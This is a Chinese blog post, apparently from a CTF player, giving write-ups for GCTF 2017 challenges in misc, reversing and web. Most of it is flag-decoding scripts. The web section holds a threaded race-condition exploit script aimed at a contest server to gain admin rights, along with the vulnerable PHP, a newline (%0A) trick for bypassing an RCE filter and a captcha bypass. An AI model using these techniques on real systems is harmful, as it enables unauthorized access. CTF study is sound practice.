@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>GCTF 2017 Write-up</title>
+  <meta name="description" content="官方的Write-up两天过去了也没有出，随手把当天做出来的题目先整理出来。">
+  <meta name="author" content="Wei Wang">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="GCTF 2017 Write-up">
+  <meta name="twitter:description" content="官方的Write-up两天过去了也没有出，随手把当天做出来的题目先整理出来。">
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="GCTF 2017 Write-up">
+  <meta property="og:description" content="官方的Write-up两天过去了也没有出，随手把当天做出来的题目先整理出来。">
+  
+  <link rel="icon" type="image/png" href="/assets/images/favicon.png" />
+  <link href="/assets/images/favicon.png" rel="shortcut icon" type="image/png">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="canonical" href="http://localhost:4000/2017/06/gctf-2017-write-up/">
+  <link rel="alternate" type="application/rss+xml" title="Lp NAL" href="http://localhost:4000/feed.xml">
+  
+  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
+  
+</head>
+
+
+  <body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="fa fa-list btn-mobile-menu__icon"></i>
+        <i class="fa fa-angle-up btn-mobile-close__icon hidden"></i>
+    </span>
+    
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/assets/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        <a href="/#blog" title="前往 Lp NAL 的主页" class="blog-button"><img src="/assets/images/avatar.jpg" width="80" alt="Lp NAL logo" class="panel-cover__logo logo" /></a>
+        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for Lp NAL" class="blog-button">Lp NAL</a></h1>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">一个CTFer的随笔和杂谈</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        
+        
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="Visit blog" class="blog-button">Blog</a></li>
+                
+              </ul>
+            </nav>
+          </div>
+          
+          <div><nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+  
+  <!-- Weibo -->
+  <li class="navigation__item">
+    <a href="http://weibo.com/ultranal" title="@ultranal 的微博" target="_blank">
+      <i class='social fa fa-weibo'></i>
+      <span class="label">Weibo</span>
+    </a>
+  </li>
+  
+
+  
+  <!-- Github -->
+  <li class="navigation__item">
+    <a href="https://github.com/ultranal" title="@ultranal 的 Github" target="_blank">
+      <i class='social fa fa-github'></i>
+      <span class="label">Github</span>
+    </a>
+  </li>
+  
+  
+  
+  <!-- Twitter -->
+  <li class="navigation__item">
+    <a href="http://twitter.com/ultranal" title="@ultranal" target="_blank">
+      <i class='social fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li>
+  
+
+  
+
+  <!-- RSS -->
+  <li class="navigation__item">
+    <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+      <i class='social fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li>
+
+  
+  <!-- Email -->
+  <li class="navigation__item">
+    <a href="mailto:ultranal@gmail.com" title="Contact me">
+      <i class='social fa fa-envelope'></i>
+      <span class="label">Email</span>
+    </a>
+  </li>
+  
+
+  </ul>
+</nav>
+</div>
+        </div>
+      </div>
+    </div>
+    
+    
+    <div class="panel-cover--overlay cover-blue"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="2017-06-12 17:32:24 +0800" itemprop="datePublished" class="post-meta__date date">2017-06-12</time> &#8226; <span class="post-meta__tags tags">writeup</span>
+    </div>
+    <h1 class="post-title">GCTF 2017 Write-up</h1>
+  </header>
+
+  <section class="post">
+    <p>官方的Write-up两天过去了也没有出，随手把当天做出来的题目先整理出来。</p>
+
+<h4 id="misc">Misc</h4>
+
+<h5 id="stage1">stage1</h5>
+
+<p>只有一张图片，很明显是图片隐写。掏出神器Stegsolve，可以发现是在左上角的黑色里面藏了一幅二维码。扫码出来是一段十六进制值，幻数03F30D可以判断是一段pyc代码，逆向之：</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
+    <span class="nb">str</span> <span class="o">=</span> <span class="p">[</span><span class="mi">65</span><span class="p">,</span>
+     <span class="mi">108</span><span class="p">,</span>
+     <span class="mi">112</span><span class="p">,</span>
+     <span class="mi">104</span><span class="p">,</span>
+     <span class="mi">97</span><span class="p">,</span>
+     <span class="mi">76</span><span class="p">,</span>
+     <span class="mi">97</span><span class="p">,</span>
+     <span class="mi">98</span><span class="p">]</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+    <span class="k">print</span> <span class="n">flag</span>
+    
+</code></pre>
+</div>
+
+<p>另存，在Python Prompt中import并调用之，得flag：AlphaLab</p>
+
+<h5 id="testpyc">test.pyc</h5>
+
+<p>同样得到一个pyc文件，不过该pyc文件的字节码被修改过，导致不能正常逆向出结果。（某<a href="http://tool.lu/pyc/">在线反编译工具</a>可以不完全逆向出一部分代码）</p>
+
+<p>查阅大量资料，尤其是<a href="http://tenshine.party/python/assembly-python.html">出题人博客</a>(貌似已停止更新)后得知，python中字节码对应PyCodeObject对象，而pyc的实质是该对象的序列化。用marshal库手工反序列化，可以得到PyCodeObject对象本身。通过对象的co_const列表，可以得到源代码中定义的所有常量。</p>
+
+<p><img src="assets/images/gctf-testpyc.png" alt="PyCodeObject" /></p>
+
+<p>可以明显看到前7个常量应当是一个反序存储的base64值，解码后发现是反向的移位1位的flag值，移位得解。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">marshal</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'test0.pyc'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()[</span><span class="mi">8</span><span class="p">:]</span> <span class="c"># 注意前8位是时间和幻数</span>
+<span class="n">co</span> <span class="o">=</span> <span class="n">marshal</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">co</span><span class="o">.</span><span class="n">co_consts</span><span class="p">[:</span><span class="mi">7</span><span class="p">])[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'base64'</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">ans</span> <span class="o">=</span> <span class="s">''</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">ans</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">ans</span>
+
+</code></pre>
+</div>
+
+<h5 id="reverseme">ReverseMe</h5>
+
+<p>本以为是逆向结果不是，把文件拖到最后可以很明显地看到FFD8FF，把文件反向之，得到一个flag的镜像（……），Photoshop处理后得到flag</p>
+
+<h4 id="reverse">Reverse</h4>
+
+<h5 id="hackme">HackMe</h5>
+
+<p>一个ELF64文件，运行提示“Give me the password“。拖进IDA发现符号表被清空，通过提示字符串的引用来源找到入口点。逆向之：</p>
+
+<p><img src="assets/images/gctf-hackme.jpg" alt="IDA Pro Reverse Code" /></p>
+
+<p>整个算法比较简单，基本逻辑是将byte_6B4270对应的字符和生成的数字异或得flag。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+<span class="k">def</span> <span class="nf">damnit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">p</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">0</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="mi">1828812941</span> <span class="o">*</span> <span class="n">damnit</span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">12345</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'input0'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">ans</span> <span class="o">=</span> <span class="s">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">22</span><span class="p">):</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">damnit</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">ans</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">ans</span>
+
+</code></pre>
+</div>
+
+<h5 id="debugexe">debug.exe</h5>
+
+<p>一个.NET 4.0可执行程序。逻辑也比较简单，实现之即可。</p>
+
+<p>注意，IDA Pro虽可以逆向.NET Executable，但只能逆向为字节码。推荐使用诸如ILSpy等.NET逆向工具，方便分析。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">hashlib</span>
+
+<span class="n">str0</span> <span class="o">=</span> <span class="s">"CreateByTenshine"</span>
+
+<span class="k">def</span> <span class="nf">primeconv</span><span class="p">(</span><span class="n">xortarget</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
+    <span class="n">prime</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">71</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">107</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">113</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">prime</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">^</span> <span class="n">xortarget</span>
+
+<span class="k">def</span> <span class="nf">createflag</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">tstr</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">x</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">15</span><span class="p">):</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">primeconv</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="n">i</span><span class="p">))</span>
+        <span class="n">tstr</span> <span class="o">+=</span> <span class="n">c</span>
+    <span class="k">return</span> <span class="s">'flag{'</span> <span class="o">+</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">tstr</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">+</span> <span class="s">'}'</span>
+
+<span class="k">print</span> <span class="n">createflag</span><span class="p">(</span><span class="n">str0</span><span class="p">)</span>
+
+</code></pre>
+</div>
+
+<h5 id="密码加密">密码加密</h5>
+
+<p>正在复盘。</p>
+
+<h4 id="web">Web</h4>
+
+<p>水平不够，来不及做……</p>
+
+<h5 id="热身题">热身题</h5>
+
+<p>index.php —&gt; robots.txt —&gt; rob0t.php —&gt; flag</p>
+
+<h5 id="变态验证码怎么破">变态验证码怎么破</h5>
+
+<p>验证码用过一次SESSION的验证码字段会被置空，所以只要不生成新的验证码，验证码就一直是空串</p>
+
+<h5 id="条件竞争">条件竞争</h5>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-type: text/html; charset=utf-8"</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="nv">$mysqli</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span> <span class="s2">"root"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">"gctf09"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">connect_errno</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"数据库连接错误，多次出现请联系管理员。"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">//打印源码
+</span><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'showcode'</span><span class="p">])){</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="nx">___FILE___</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">();</span>
+
+<span class="p">}</span>
+<span class="nv">$user</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+<span class="c1">// 初次访问生成用户
+</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"name"</span><span class="p">])){</span>
+    <span class="nv">$user</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">uniqid</span><span class="p">()</span><span class="o">.</span><span class="nb">uniqid</span><span class="p">()),</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]</span><span class="o">=</span><span class="nv">$user</span><span class="p">;</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nv">$user</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"name"</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="c1">//重置时清理用户信息
+</span><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"POST"</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'method'</span><span class="p">]</span><span class="o">===</span><span class="s2">"reset"</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="p">){</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"DELETE FROM gctf09.`user` where name=?"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"DELETE FROM gctf09.`priv` where name=?"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="c1">//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限
+</span>    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"修改成功"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>在重置用户的时候，用户表中的相应记录是先删除后添加，于是产生条件竞争，只要打好这个时间差就好。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">thread</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s">'Register Thread'</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">' Start'</span>
+    <span class="n">param</span> <span class="o">=</span> <span class="p">{</span><span class="s">'method'</span><span class="p">:</span> <span class="s">'reset'</span><span class="p">}</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'name'</span><span class="p">:</span> <span class="s">'9ee1bb39dceeece1'</span><span class="p">,</span> <span class="s">'password'</span><span class="p">:</span> <span class="s">'as9en'</span><span class="p">}</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'PHPSESSID'</span><span class="p">:</span> <span class="s">'jk4f54scqb3uroubqi87tfoaq7'</span><span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://218.2.197.242:18009/'</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="n">param</span><span class="p">,</span> \
+        <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+
+<span class="k">def</span> <span class="nf">getflag</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s">'GetFlag Thread'</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">' Start'</span>
+    <span class="n">param</span> <span class="o">=</span> <span class="p">{</span><span class="s">'method'</span><span class="p">:</span> <span class="s">'login'</span><span class="p">}</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'name'</span><span class="p">:</span> <span class="s">'9ee1bb39dceeece1'</span><span class="p">,</span> <span class="s">'password'</span><span class="p">:</span> <span class="s">'as9en'</span><span class="p">}</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'PHPSESSID'</span><span class="p">:</span> <span class="s">'jk4f54scqb3uroubqi87tfoaq7'</span><span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://218.2.197.242:18009/login.php'</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="n">param</span><span class="p">,</span> \
+        <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">register</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">getflag</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">getflag</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">getflag</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">getflag</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">getflag</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+
+</code></pre>
+</div>
+
+<p>不要问我为啥那么多getflag……服务器太卡</p>
+
+<h5 id="rce绕过">RCE绕过</h5>
+
+<p>一个有简单过滤的RCE，用%0A换行符即可绕过。</p>
+
+<h5 id="java序列化">Java序列化</h5>
+
+<p>这题是复盘时候拿出来的，主要开头想法不对，一直在想办法反序列化相应对象。结果最后十六进制修改了id对应的值就拿到Flag了……QAQ</p>
+
+
+  </section>
+</article>
+
+<section class="read-more">
+   
+   
+   
+   
+   <div class="read-more-item">
+       <span class="read-more-item-dim">更早的文章</span>
+       <h2 class="post-list__post-title post-title"><a href="/2017/06/a-essay-for-a-couple-years.md.bak/" title="link to 两年随笔">两年随笔</a></h2>
+       <p class="excerpt">两年多了，也没有怎么写过东西。这个博客是这两年的头一篇博客，那么就随手写写这两年吧。专业这么多年的OIer干下来，结果到了大学也没能继续。反倒是鬼使神差地转进了CTFer这个行当。不过，干一行爱一行，倒没有觉得什么不快，反倒是PWN一类的东西和体系结构结合的还算紧密，也算是找到了一个新的兴趣点吧。（然而体系结构学的并不怎么样，PWN也是完全……）确实，弱校会带给人一个假象，让人感觉自己无所不能似的。毕竟在这里，你只要稍微努把力，或许就可以超过许许多多的人。不过反过来讲，不用太过浪费气力去竞...&hellip;</p>
+       <div class="post-list__meta"><time datetime="2017-06-12 04:49:25 +0800" class="post-list__meta--date date">2017-06-12</time> &#8226; <span class="post-list__meta--tags tags">随笔</span><a class="btn-border-small" href=/2017/06/a-essay-for-a-couple-years.md.bak/>继续阅读</a></div>
+   </div>
+   
+</section>
+
+<section class="post-comments">
+  
+    <div id="disqus_thread"></div>
+    <script>
+    
+    var disqus_config = function () {
+        this.page.url = "http://localhost:4000/2017/06/gctf-2017-write-up/";
+        this.page.identifier = "/2017/06/gctf-2017-write-up/";
+    };
+
+    var disqus_shortname = 'lpnal';
+    
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>要查看<a href="http://disqus.com/?ref_noscript"> Disqus </a>评论，请启用 JavaScript</noscript>
+    
+  
+  
+  
+  
+</section>
+
+
+            <section class="footer">
+    <footer>
+    	<span class="footer__copyright">本站点采用<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享 署名-非商业性使用-相同方式共享 4.0 国际 许可协议</a></span>
+        <span class="footer__copyright">由 <a href="https://jekyllrb.com">Jekyll</a> 于 2017-06-12 生成，感谢 <a href="https://www.digitalocean.com/?refcode=30ed2d146762">Digital Ocean</a> 为本站提供稳定的 VPS 服务</span>
+        <span class="footer__copyright">本站由 <a href="http://blog.lpnal.me">@asp3n</a> 创建，采用 <a href="https://github.com/onevcat/vno-jekyll">Vno - Jekyll</a> 作为主题，您可以在 GitHub 找到<a href="https://github.com/onevcat/OneV-s-Den">本站源码</a> - &copy; 2017</span>
+    </footer>
+</section>
+
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+
+
+    
+  </body>
+
+</html>
